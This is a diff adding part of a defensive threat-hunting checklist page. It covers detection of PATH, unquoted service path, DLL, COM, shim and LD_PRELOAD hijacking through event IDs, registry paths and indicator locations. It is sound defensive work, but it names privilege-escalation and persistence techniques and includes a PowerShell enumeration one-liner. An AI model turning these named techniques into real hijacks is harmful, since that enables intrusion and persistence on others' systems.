+  <li><label><input type="checkbox"> Review Event ID 4657 for PATH registry value modifications</label></li>
+  <li><label><input type="checkbox"> Search Event ID 4688/PowerShell Event ID 4104 for: setx PATH, reg add commands, [Environment]::SetEnvironmentVariable</label></li>
+  <li><label><input type="checkbox"> Identify user-writable directories prepended to system PATH (searched before system directories)</label></li>
+  <li><label><input type="checkbox"> Look for executables with system utility names in new PATH directories (%TEMP%\cmd.exe, %APPDATA%\powershell.exe)</label></li>
+</ul>
+
+<h2>4. Unquoted Service Paths Exploitation</h2>
+<ul>
+  <li><label><input type="checkbox"> Enumerate services with unquoted paths containing spaces: <code>Get-WmiObject Win32_Service | Where {$_.PathName -notmatch '^&quot;.*&quot;'}</code></label></li>
+  <li><label><input type="checkbox"> Check Sysmon Event ID 11 for executables created at: <code>C:\Program.exe</code>, <code>C:\Program Files\Vendor.exe</code></label></li>
+  <li><label><input type="checkbox"> Review Event ID 7045/4697 for service installation with unquoted ImagePath</label></li>
+  <li><label><input type="checkbox"> Search Event ID 4688 for services.exe spawning processes from intermediate path locations</label></li>
+  <li><label><input type="checkbox"> Identify Sysmon Event ID 13 modifications removing quotes from service ImagePath registry values</label></li>
+</ul>
+
+<h2>5. Weak File Permissions on Executables</h2>
+<ul>
+  <li><label><input type="checkbox"> Review Event ID 4663 for write/delete access to system executables in: <code>C:\Windows\System32\</code>, <code>C:\Program Files\</code></label></li>
+  <li><label><input type="checkbox"> Check Sysmon Event ID 11 for overwrites to service executables or system binaries</label></li>
+  <li><label><input type="checkbox"> Identify Event ID 4670 showing ACL modifications on executable files</label></li>
+  <li><label><input type="checkbox"> Search for executables with weak permissions: Everyone (F), Users (W), Authenticated Users (M)</label></li>
+  <li><label><input type="checkbox"> Look for Sysmon Event ID 2 (file creation time changes) on legitimate executables (timestomping indicators)</label></li>
+</ul>
+
+<h2>6. Phantom DLL Hijacking</h2>
+<ul>
+  <li><label><input type="checkbox"> Check application logs (Event ID 1000/1001) for DLL load failures</label></li>
+  <li><label><input type="checkbox"> Review Sysmon Event ID 11 for DLL creation in paths where applications previously failed to load libraries</label></li>
+  <li><label><input type="checkbox"> Identify common phantom DLLs: CRYPTSP.dll, CRYPTBASE.dll, WINMM.dll, WTSAPI32.dll, SAMLIB.dll</label></li>
+  <li><label><input type="checkbox"> Search for applications loading newly created DLLs matching previously failed load attempts</label></li>
+  <li><label><input type="checkbox"> Look for DLL files created in application directories after application execution begins</label></li>
+</ul>
+
+<h2>7. COM Hijacking Detection</h2>
+<ul>
+  <li><label><input type="checkbox"> Review Sysmon Event ID 13 for modifications to: <code>HKCU\Software\Classes\CLSID\*\InprocServer32</code>, <code>\LocalServer32</code></label></li>
+  <li><label><input type="checkbox"> Check Event ID 4657 for CLSID registry value modifications</label></li>
+  <li><label><input type="checkbox"> Search for InprocServer32/LocalServer32 paths pointing to: <code>%TEMP%</code>, <code>%APPDATA%</code>, <code>C:\ProgramData\</code></label></li>
+  <li><label><input type="checkbox"> Identify new user-level CLSID entries (Sysmon Event ID 12) shadowing system CLSIDs</label></li>
+  <li><label><input type="checkbox"> Look for dllhost.exe or rundll32.exe loading DLLs from non-standard locations via COM instantiation</label></li>
+</ul>
+
+<h2>8. Application Shimming &amp; DLL Redirection</h2>
+<ul>
+  <li><label><input type="checkbox"> Check Event ID 8002/8003 for shim database installation and application shimming events</label></li>
+  <li><label><input type="checkbox"> Review Event ID 4688/Sysmon Event ID 1 for sdbinst.exe execution with custom SDB files</label></li>
+  <li><label><input type="checkbox"> Search Sysmon Event ID 11 for .sdb file creation in: <code>C:\Windows\AppPatch\Custom\</code>, user directories</label></li>
+  <li><label><input type="checkbox"> Identify Sysmon Event ID 13 modifications to: <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\</code></label></li>
+  <li><label><input type="checkbox"> Look for shim databases applying fixes to: cmd.exe, powershell.exe, system utilities, LOLBins</label></li>
+</ul>
+
+<h2>9. Library Preloading (Linux/macOS)</h2>
+<ul>
+  <li><label><input type="checkbox"> Check file modifications to: <code>/etc/ld.so.preload</code>, <code>/etc/ld.so.conf.d/</code>, shell startup scripts</label></li>
+  <li><label><input type="checkbox"> Review bash history for: <code>export LD_PRELOAD</code>, <code>export DYLD_INSERT_LIBRARIES</code> commands</label></li>
+  <li><label><input type="checkbox"> Search for .so files in temporary directories: <code>/tmp/</code>, <code>/dev/shm/</code>, user home directories</label></li>
+  <li><label><input type="checkbox"> Identify LD_PRELOAD usage targeting critical binaries: sudo, sshd</label></li>
+</ul>
+
+
+</body>
+</html>
